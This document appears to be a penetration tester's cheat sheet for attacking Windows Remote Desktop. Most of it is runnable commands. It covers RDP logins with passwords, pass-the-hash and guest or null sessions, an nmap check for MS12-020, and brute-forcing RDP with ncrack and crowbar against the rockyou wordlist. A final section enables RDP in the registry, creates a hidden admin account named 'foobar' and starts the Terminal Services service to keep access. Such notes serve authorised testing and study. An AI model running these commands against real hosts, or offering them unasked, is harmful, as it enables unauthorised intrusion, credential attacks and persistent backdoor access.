Pay attention to the possibility of adding a user via other vulnerability and accessing by RDP. [[Port 139 445 (Exploits)#MS17-010 method 2 RDP]]

#### rdesktop Domain User:
```bash - kali
rdesktop -u $USER -p $PASSWORD -d $NETBIOS_DOMAIN_NAME -g 85% -r disk:share=/home/kali/Desktop/ $TARGET
```

#### rdesktop
```bash - kali
rdesktop $TARGET -u foobar -p Pass123 -g 1024x768 -x 0x80
```

Connect with share:
```bash - kali
rdesktop -u $USER -p $PASSWORD -g 85% -r disk:share=/home/kali/Desktop/ $TARGET
```

![[Pasted image 20220516171239.png]]

Guest login:
```bash - kali
rdesktop -u guest -p guest $TARGET -g 94%
```

#### xfreerdp Domain User:

```bash - kali
xfreerdp /u:$USER /p:$PASSWORD /d:$NETBIOS_DOMAIN_NAME /v:$TARGET
```

```bash - kali
xfreerdp /u:$USER /pth:$HASH /d:$NETBIOS_DOMAIN_NAME /v:$TARGET
```

Connect with share:
```bash - kali
xfreerdp /u:$USER /p:$PASSWORD /v:TARGET /drive:kali,/home/kali/Desktop/
```

#### xfreerdp
```bash - kali
xfreerdp /v:$TARGET -sec-nla /u:""
```

```bash - kali
xfreerdp /u:$USER /p:$PASSWORD /cert:ignore /v:$TARGET
```

#### nmap
```bash - kali
nmap -p 3389 --script=rdp-vuln-ms12-020.nse $TARGET
```

#### ncrack
```bash - kali
ncrack -vv --user $USER -P /usr/share/wordlists/rockyou.txt rdp://$TARGET
```

#### crowbar
```bash - kali
python crowbar.py -b rdp -s $TARGET/32 -u $USER -C ../rockyou.txt -v
```

### Enabling RDP
```command prompt - kali
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

#### Add a new user to Admin, good for RDP
```command prompt - kali
net user foobar Pass123 /add
```

```command prompt - kali
net localgroup Administrators foobar /add
```

```command prompt - kali
sc config TermService start=auto
```

```command prompt - kali
net start TermService
```

```bash - kali
rdesktop -g 85% -r disk:share=/home/kali/Desktop/ -u foobar -p Pass123 $TARGET
```

See also:
[[Crowbar]]